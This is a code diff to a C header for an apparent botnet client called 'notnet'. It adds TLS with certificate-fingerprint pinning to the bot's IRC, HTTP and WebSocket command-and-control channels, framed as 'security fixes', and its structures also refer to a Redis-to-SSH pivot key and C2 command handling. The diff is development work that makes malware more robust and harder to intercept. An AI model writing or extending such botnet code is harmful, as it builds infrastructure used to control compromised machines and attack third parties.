@@ -15,6 +15,17 @@
 #define C2_HTTP  0x02
 #define C2_WS    0x04
 
+/* ── TLS ─────────────────────────────────────────────────────── */
+/* TLS wrapper for existing socket fds.
+ * TLS_ENABLED must be defined at compile time (-DTLS_ENABLED).
+ * If TLS is not compiled in, tls_* functions are no-ops that pass
+ * through to the raw socket. */
+typedef struct {
+    int enabled;
+    void *ssl;       /* SSL* from OpenSSL, or NULL if TLS disabled */
+    int sock;        /* underlying socket fd */
+} notnet_tls_t;
+
 /* ── IRC State ──────────────────────────────────────────────── */
 typedef struct {
     char server[256];
@@ -33,6 +44,10 @@ typedef struct {
      * is cached here. Reconnects must use the same pinned IP. */
     int dns_pinned;
     struct in_addr pinned_addr;
+    /* SECURITY FIX (#76): TLS state. Only used when compiled with
+     * -DTLS_ENABLED and a cert pin is configured; otherwise disabled
+     * and all I/O falls through to the raw socket. */
+    notnet_tls_t tls;
     int sock;
     int connected;
     int authenticated;
@@ -49,6 +64,8 @@ typedef struct {
     /* SECURITY FIX (#10): DNS pinning */
     int dns_pinned;
     struct in_addr pinned_addr;
+    /* SECURITY FIX (#76): TLS state (see notnet_irc_t.tls) */
+    notnet_tls_t tls;
     int sock;
     int connected;
     time_t last_beat;
@@ -62,6 +79,8 @@ typedef struct {
     /* SECURITY FIX (#10): DNS pinning */
     int dns_pinned;
     struct in_addr pinned_addr;
+    /* SECURITY FIX (#76): TLS state (see notnet_irc_t.tls) */
+    notnet_tls_t tls;
     int sock;
     int connected;
     time_t last_beat;
@@ -146,6 +165,13 @@ typedef struct {
      * so the Redis -> SSH-22 pivot could never authenticate. */
     char redis_ssh_key[1024];
 
+    /* SECURITY FIX (#76): SHA-256 fingerprint pin of the TLS server
+     * certificate. When compiled with -DTLS_ENABLED and this pin is set,
+     * all three C2 channels wrap their sockets in TLS and verify the peer
+     * cert fingerprint before use. Config: tls_cert_pin_sha256= or env
+     * NOTNET_TLS_CERT_PIN_SHA256. Empty = TLS not activated. */
+    char tls_cert_pin_sha256[65];
+
     /* SECURITY FIX (#14): Rate limiting for C2 commands */
     time_t last_cmd_time;
     int cmd_this_second;
@@ -188,17 +214,14 @@ char *protocol_hex_encode(const char *data, int len);
 int protocol_send_response(notnet_bot_t *bot, const char *command, const char *result);
 
 /* ── TLS ─────────────────────────────────────────────────────── */
-/* TLS wrapper for existing socket fds.
- * TLS_ENABLED must be defined at compile time (-DTLS_ENABLED).
- * If TLS is not compiled in, tls_* functions are no-ops that pass
- * through to the raw socket. */
-typedef struct {
-    int enabled;
-    void *ssl;       /* SSL* from OpenSSL, or NULL if TLS disabled */
-    int sock;        /* underlying socket fd */
-} notnet_tls_t;
-
+/* (notnet_tls_t is defined above, before the channel structs that
+ * embed it.) */
 int tls_init(notnet_tls_t *tls, int sock);
+int tls_setup(notnet_tls_t *tls, int sock, const char *server_name,
+              const char *pin_hex);
+int tls_pending(notnet_tls_t *tls);
+int chan_send(notnet_tls_t *tls, int sock, const char *buf, int len);
+int chan_recv(notnet_tls_t *tls, int sock, char *buf, int len);
 int tls_handshake(notnet_tls_t *tls, const char *server_name);
 int tls_send(notnet_tls_t *tls, const char *buf, int len);
 int tls_recv(notnet_tls_t *tls, char *buf, int len);
